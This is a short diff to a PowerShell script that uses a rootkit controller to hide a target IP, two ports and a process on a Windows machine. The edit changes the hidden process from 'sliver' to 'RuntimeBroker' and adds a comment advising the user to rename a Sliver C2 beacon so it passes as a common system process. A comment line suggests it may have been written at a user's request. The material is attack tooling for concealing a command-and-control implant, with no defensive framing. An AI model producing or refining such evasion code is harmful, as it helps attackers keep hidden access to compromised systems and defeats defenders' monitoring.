@@ -135,7 +135,7 @@ if (-not (Test-Path "NetRootKitController.exe")) {
 # The IP, Ports, and Process the user requested to hide
 $TargetIP = "10.2.0.144"
 $PortsToHide = @("8888", "8081")
-$ProcessToHide = "sliver"  # Change this to whatever your beacon name is!
+$ProcessToHide = "RuntimeBroker"  # A common, ubiquitous Windows process. Rename your sliver beacon to this!
 
 Write-Host "[*] Checking connection to driver..."
 .\NetRootKitController.exe check-connection "Ping"
